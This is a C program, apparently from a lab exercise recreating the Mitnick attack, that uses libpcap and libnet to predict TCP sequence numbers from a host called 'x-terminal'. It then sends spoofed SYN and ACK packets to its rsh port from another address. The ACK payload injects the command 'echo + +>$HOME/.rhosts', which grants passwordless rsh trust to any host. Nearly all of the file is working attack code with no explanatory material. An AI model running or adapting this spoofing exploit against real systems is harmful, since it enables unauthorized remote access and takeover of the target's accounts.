#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <libnet.h>

/* default snap length (maximum bytes per packet to capture) */
#define SNAP_LEN 1518

/* ethernet headers are always exactly 14 bytes [1] */
#define SIZE_ETHERNET 14

/* Ethernet addresses are 6 bytes */
#define ETHER_ADDR_LEN	6

/* Ethernet header */
struct sniff_ethernet {
        u_char  ether_dhost[ETHER_ADDR_LEN];    /* destination host address */
        u_char  ether_shost[ETHER_ADDR_LEN];    /* source host address */
        u_short ether_type;                     /* IP? ARP? RARP? etc */
};

u_int32_t sequence=0;
u_int32_t difference;

/* IP header */
struct sniff_ip {
        u_char  ip_vhl;                 /* version << 4 | header length >> 2 */
        u_char  ip_tos;                 /* type of service */
        u_short ip_len;                 /* total length */
        u_short ip_id;                  /* identification */
        u_short ip_off;                 /* fragment offset field */
        #define IP_RF 0x8000            /* reserved fragment flag */
        #define IP_DF 0x4000            /* dont fragment flag */
        #define IP_MF 0x2000            /* more fragments flag */
        #define IP_OFFMASK 0x1fff       /* mask for fragmenting bits */
        u_char  ip_ttl;                 /* time to live */
        u_char  ip_p;                   /* protocol */
        u_short ip_sum;                 /* checksum */
        struct  in_addr ip_src,ip_dst;  /* source and dest address */
};
#define IP_HL(ip)               (((ip)->ip_vhl) & 0x0f)
#define IP_V(ip)                (((ip)->ip_vhl) >> 4)

/* TCP header */
typedef u_int tcp_seq;

struct sniff_tcp {
        u_short th_sport;               /* source port */
        u_short th_dport;               /* destination port */
        tcp_seq th_seq;                 /* sequence number */
        tcp_seq th_ack;                 /* acknowledgement number */
        u_char  th_offx2;               /* data offset, rsvd */
#define TH_OFF(th)      (((th)->th_offx2 & 0xf0) >> 4)
        u_char  th_flags;
        #define TH_FIN  0x01
        #define TH_SYN  0x02
        #define TH_RST  0x04
        #define TH_PUSH 0x08
        #define TH_ACK  0x10
        #define TH_URG  0x20
        #define TH_ECE  0x40
        #define TH_CWR  0x80
        #define TH_FLAGS        (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
        u_short th_win;                 /* window */
        u_short th_sum;                 /* checksum */
        u_short th_urp;                 /* urgent pointer */
};

void
got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);

void
print_payload(const u_char *payload, int len);

void
print_hex_ascii_line(const u_char *payload, int len, int offset);

void
print_app_banner(void);

void
print_app_usage(void);





/*
 * print data in rows of 16 bytes: offset   hex   ascii
 *
 * 00000   47 45 54 20 2f 20 48 54  54 50 2f 31 2e 31 0d 0a   GET / HTTP/1.1..
 */
void
print_hex_ascii_line(const u_char *payload, int len, int offset)
{

	int i;
	int gap;
	const u_char *ch;

	/* offset */
	printf("%05d   ", offset);
	
	/* hex */
	ch = payload;
	for(i = 0; i < len; i++) {
		printf("%02x ", *ch);
		ch++;
		/* print extra space after 8th byte for visual aid */
		if (i == 7)
			printf(" ");
	}
	/* print space to handle line less than 8 bytes */
	if (len < 8)
		printf(" ");
	
	/* fill hex gap with spaces if not full line */
	if (len < 16) {
		gap = 16 - len;
		for (i = 0; i < gap; i++) {
			printf("   ");
		}
	}
	printf("   ");
	
	/* ascii (if printable) */
	ch = payload;
	for(i = 0; i < len; i++) {
		if (isprint(*ch))
			printf("%c", *ch);
		else
			printf(".");
		ch++;
	}

	printf("\n");

return;
}

/*
 * print packet payload data (avoid printing binary data)
 */
void
print_payload(const u_char *payload, int len)
{

	int len_rem = len;
	int line_width = 16;			/* number of bytes per line */
	int line_len;
	int offset = 0;					/* zero-based offset counter */
	const u_char *ch = payload;

	if (len <= 0)
		return;

	/* data fits on one line */
	if (len <= line_width) {
		print_hex_ascii_line(ch, len, offset);
		return;
	}

	/* data spans multiple lines */
	for ( ;; ) {
		/* compute current line length */
		line_len = line_width % len_rem;
		/* print line */
		print_hex_ascii_line(ch, line_len, offset);
		/* compute total remaining */
		len_rem = len_rem - line_len;
		/* shift pointer to remaining bytes to print */
		ch = ch + line_len;
		/* add offset */
		offset = offset + line_width;
		/* check if we have line width chars or less */
		if (len_rem <= line_width) {
			/* print last line and get out */
			print_hex_ascii_line(ch, len_rem, offset);
			break;
		}
	}

return;
}

/*
 * dissect/print packet
 */
void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{

	static int count = 1;                   /* packet counter */
	
	/* declare pointers to packet headers */
	const struct sniff_ethernet *ethernet;  /* The ethernet header [1] */
	const struct sniff_ip *ip;              /* The IP header */
	const struct sniff_tcp *tcp;            /* The TCP header */
	const char *payload;                    /* Packet payload */

	int size_ip;
	int size_tcp;
	int size_payload;
	
	
	count++;
	
	/* define ethernet header */
	ethernet = (struct sniff_ethernet*)(packet);
	
	/* define/compute ip header offset */
	ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
	size_ip = IP_HL(ip)*4;
	if (size_ip < 20) {
		printf("   * Invalid IP header length: %u bytes\n", size_ip);
		return;
	}
	
		
	
	
	/* define/compute tcp header offset */
	tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
	size_tcp = TH_OFF(tcp)*4;
	if (size_tcp < 20) {
		printf("   * Invalid TCP header length: %u bytes\n", size_tcp);
		return;
	}
	u_int32_t number=0;
	if(strcmp("172.16.18.5",  inet_ntoa(ip->ip_src))==0)
		{printf("Sequence number from x-terminal is: %lu\n", htobe32(tcp->th_seq)); 
		printf("ACK number from x-terminal is: %lu\n", htobe32(tcp->th_ack)); 
		number=htobe32(tcp->th_seq);
		difference=number-sequence;
		sequence=htobe32(tcp->th_seq);}
	if(strcmp("172.16.18.4",  inet_ntoa(ip->ip_src))==0)
		{printf("Sent sequence is: %lu\n", htobe32(tcp->th_seq));
		printf("Sent ack is: %lu\n", htobe32(tcp->th_ack)); }
	/*printf("   Dst port: %d\n", ntohs(tcp->th_dport));
	
	printf("   ack je: %d\n", tcp->th_ack);*/
	
	/* define/compute tcp payload (segment) offset */
	payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
	
	/* compute tcp payload (segment) size */
	size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);
	
	/*
	 * Print payload data; it might be binary, so don't just
	 * treat it as a string.
	 */
	if(strcmp("172.16.18.5",  inet_ntoa(ip->ip_dst))==0){
	if (size_payload > 0) {
		printf("   Payload (%d bytes):\n", size_payload);
		print_payload(payload, size_payload);
		fflush(stdout);
	}
	}
return;
}

int main(int argc, char **argv)
{

	char *dev = NULL;			/* capture device name */
	char errbuf[PCAP_ERRBUF_SIZE];		/* error buffer */
	pcap_t *handle;				/* packet capture handle */

	char filter_exp[] = "ip";		/* filter expression [3] */
	struct bpf_program fp;			/* compiled filter program (expression) */
	bpf_u_int32 mask;			/* subnet mask */
	bpf_u_int32 net;			/* ip */
	int num_packets = 30;			/* number of packets to capture */



	/* check for capture device name on command-line */
	if (argc == 2) {
		dev = argv[1];
	}
	else if (argc > 2) {
		fprintf(stderr, "error: unrecognized command-line options\n\n");
		
		exit(EXIT_FAILURE);
	}
	else {
		/* find a capture device if not specified on command-line */
		dev = pcap_lookupdev(errbuf);
		if (dev == NULL) {
			fprintf(stderr, "Couldn't find default device: %s\n",
			    errbuf);
			exit(EXIT_FAILURE);
		}
	}
	
	/* get network number and mask associated with capture device */
	if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
		fprintf(stderr, "Couldn't get netmask for device %s: %s\n",
		    dev, errbuf);
		net = 0;
		mask = 0;
	}
	
	/* print capture info */
	printf("Device: %s\n", dev);
	printf("Number of packets: %d\n", num_packets);
	printf("Filter expression: %s\n", filter_exp);

	/* open capture device */
	handle = pcap_open_live(dev, SNAP_LEN, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		exit(EXIT_FAILURE);
	}

	/* make sure we're capturing on an Ethernet device [2] */
	if (pcap_datalink(handle) != DLT_EN10MB) {
		fprintf(stderr, "%s is not an Ethernet\n", dev);
		exit(EXIT_FAILURE);
	}

	/* compile the filter expression */
	if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
		fprintf(stderr, "Couldn't parse filter %s: %s\n",
		    filter_exp, pcap_geterr(handle));
		exit(EXIT_FAILURE);
	}

	/* apply the compiled filter */
	if (pcap_setfilter(handle, &fp) == -1) {
		fprintf(stderr, "Couldn't install filter %s: %s\n",
		    filter_exp, pcap_geterr(handle));
		exit(EXIT_FAILURE);
	}
	libnet_t *l;
	int i=0;
	char errbuf1[LIBNET_ERRBUF_SIZE],  ip_addr_str[16];
	
	
	u_int32_t ip_addr_s, ip_addr_d;
	 u_long ip;
	
	
	
	libnet_ptag_t tcp;
	libnet_ptag_t ipv4;
	for(i=0; i<5; i++){
			l = libnet_init (LIBNET_RAW4, NULL, errbuf1);
			 if (l == NULL)
			    {
			      fprintf (stderr, "Error opening context: %s", errbuf1);
			      exit (1);
			    }
		
		u_int32_t see=15;
		ip_addr_s = libnet_name2addr4(l, "172.16.18.3",\
		          LIBNET_DONT_RESOLVE);
		ip_addr_d = libnet_name2addr4(l, "172.16.18.5",\
		          LIBNET_DONT_RESOLVE);
			tcp = 0;    /* libnet protocol block */
			tcp = libnet_build_tcp (libnet_get_prand (LIBNET_PRu16),    /* src port */
					  514,    /* destination port */
					  see,    /* sequence number */
					  0,    /* acknowledgement */
					  TH_SYN,    /* control flags */
					  libnet_get_prand (LIBNET_PRu16),    /* window */
					  0,    /* checksum - 0 = autofill */
					  0,    /* urgent */
					  LIBNET_TCP_H,    /* header length */
					  NULL,    /* payload */
					  0,    /* payload length */
					  l,    /* libnet context */
					  tcp);    /* protocol tag */

			if (tcp == -1)
			 {
			   fprintf (stderr,
			       "Unable to build TCP header: %s\n", libnet_geterror (l));
			   exit (1);
			 }

			 ipv4 = 0;    /* libnet protocol block */

			ipv4 = libnet_build_ipv4 (LIBNET_TCP_H + LIBNET_IPV4_H,    /* length */
					0,    /* TOS */
					libnet_get_prand (LIBNET_PRu16),    /* IP ID */
					0,    /* frag offset */
					127,    /* TTL */
					IPPROTO_TCP,    /* upper layer protocol */
					0,    /* checksum, 0=autofill */
					ip_addr_s,    /* src IP */
					ip_addr_d,    /* dest IP */
					NULL,    /* payload */
					0,    /* payload len */
					l,    /* libnet context */
					ipv4);    /* protocol tag */

			if (ipv4 == -1)
			  {
			    fprintf (stderr,
			       "Unable to build IPv4 header: %s\n", libnet_geterror (l));
			    exit (1);
			  }
	
			 if ((libnet_write (l)) == -1)
		    {
		      fprintf (stderr, "Unable to send packet: %s\n",
			   libnet_geterror (l));
		      exit (1);
		    }
	
	}
	/* now we can set our callback function */
	
	pcap_loop(handle, 20, got_packet, NULL);
	

	printf("\nCapture complete. Last sequence received: %u\n", sequence);
	u_int32_t firstseq=16000;
	printf("\n First sequence sent: %lu", firstseq);
	difference=difference+1;
	
	printf("\n Difference that will be added on last sequence: %lu", difference);
	fflush(stdout);
	//SENDING THE SYN TO X-TERMINAL
	l = libnet_init (LIBNET_RAW4, NULL, errbuf1);
	 if (l == NULL)
	    {
	      fprintf (stderr, "Error opening context: %s", errbuf1);
	      exit (1);
	    }
	ip_addr_s = libnet_name2addr4(l, "172.16.18.4",\
                  LIBNET_DONT_RESOLVE);
	ip_addr_d = libnet_name2addr4(l, "172.16.18.5",\
                  LIBNET_DONT_RESOLVE);
		tcp = 0;    /* libnet protocol block */
		tcp = libnet_build_tcp (999,    /* src port */
				  514,    /* destination port */
				  firstseq,    /* sequence number */
				  0,    /* acknowledgement */
				  TH_SYN,    /* control flags */
				  //libnet_get_prand (LIBNET_PRu16),    /* window */
				  5840,
				  0,    /* checksum - 0 = autofill */
				  0,    /* urgent */
				  LIBNET_TCP_H,    /* header length */
				  NULL,    /* payload */
				  0,    /* payload length */
				  l,    /* libnet context */
				  tcp);    /* protocol tag */

		if (tcp == -1)
		 {
		   fprintf (stderr,
		       "Unable to build TCP header: %s\n", libnet_geterror (l));
		   exit (1);
		 }

		 ipv4 = 0;    /* libnet protocol block */
		
		ipv4 = libnet_build_ipv4 (LIBNET_TCP_H + LIBNET_IPV4_H,    /* length */
				0,    /* TOS */
				libnet_get_prand (LIBNET_PRu16),    /* IP ID */
				0,    /* frag offset */
				127,    /* TTL */
				IPPROTO_TCP,    /* upper layer protocol */
				0,    /* checksum, 0=autofill */
				ip_addr_s,    /* src IP */
				ip_addr_d,    /* dest IP */
				NULL,    /* payload */
				0,    /* payload len */
				l,    /* libnet context */
				ipv4);    /* protocol tag */

		if (ipv4 == -1)
		  {
		    fprintf (stderr,
		       "Unable to build IPv4 header: %s\n", libnet_geterror (l));
		    exit (1);
		  }
	
		 if ((libnet_write (l)) == -1)
	    {
	      fprintf (stderr, "Unable to send packet: %s\n",
		   libnet_geterror (l));
	      exit (1);
	    }

	char payload[]="\0tsutomu\0tsutomu\0echo + +>$HOME/.rhosts\0";
	int s=sizeof(payload);
	printf("\n Size of payload: %d", s);
	firstseq=firstseq+1;
	printf("\n 2nd sequence: %lu", firstseq);
	u_int32_t ack=sequence+difference;
	printf("\n Ack sent is: %lu", ack);
	fflush(stdout);
	//SENDING THE ACK WITH PAYLOAD
	l = libnet_init (LIBNET_RAW4, NULL, errbuf1);
	 if (l == NULL)
	    {
	      fprintf (stderr, "Error opening context: %s", errbuf1);
	      exit (1);
	    }
	ip_addr_s = libnet_name2addr4(l, "172.16.18.4",\
                  LIBNET_DONT_RESOLVE);
	ip_addr_d = libnet_name2addr4(l, "172.16.18.5",\
                  LIBNET_DONT_RESOLVE);
		 tcp = 0;    /* libnet protocol block */
		tcp = libnet_build_tcp (999,    /* src port */
				  514,    /* destination port */
				  firstseq,    /* sequence number */
				  ack,    /* acknowledgement */
				  TH_ACK,    /* control flags */
				  libnet_get_prand (LIBNET_PRu16),    /* window */
				  0,    /* checksum - 0 = autofill */
				  0,    /* urgent */
				  LIBNET_TCP_H+sizeof(payload),    /* header length */
				  (u_int8_t*)payload,    /* payload */
				  sizeof(payload),    /* payload length */
				  l,    /* libnet context */
				  tcp);    /* protocol tag */

		if (tcp == -1)
		 {
		   fprintf (stderr,
		       "Unable to build TCP header: %s\n", libnet_geterror (l));
		   exit (1);
		 }

		 ipv4 = 0;    /* libnet protocol block */

		ipv4 = libnet_build_ipv4 (LIBNET_TCP_H + LIBNET_IPV4_H+sizeof(payload),    /* length */
				0,    /* TOS */
				libnet_get_prand (LIBNET_PRu16),    /* IP ID */
				0,    /* frag offset */
				127,    /* TTL */
				IPPROTO_TCP,    /* upper layer protocol */
				0,    /* checksum, 0=autofill */
				ip_addr_s,    /* src IP */
				ip_addr_d,    /* dest IP */
				NULL,    /* payload */
				0,    /* payload len */
				l,    /* libnet context */
				ipv4);    /* protocol tag */

		if (ipv4 == -1)
		  {
		    fprintf (stderr,
		       "Unable to build IPv4 header: %s\n", libnet_geterror (l));
		    exit (1);
		  }
	
		 if ((libnet_write (l)) == -1)
	    {
	      fprintf (stderr, "Unable to send packet: %s\n",
		   libnet_geterror (l));
	      exit (1);
	    }

	
	printf("\n Changing rhosts file done!");
	pcap_loop(handle, 5, got_packet, NULL);
	pcap_freecode(&fp);
	pcap_close(handle);
	return 0;
}

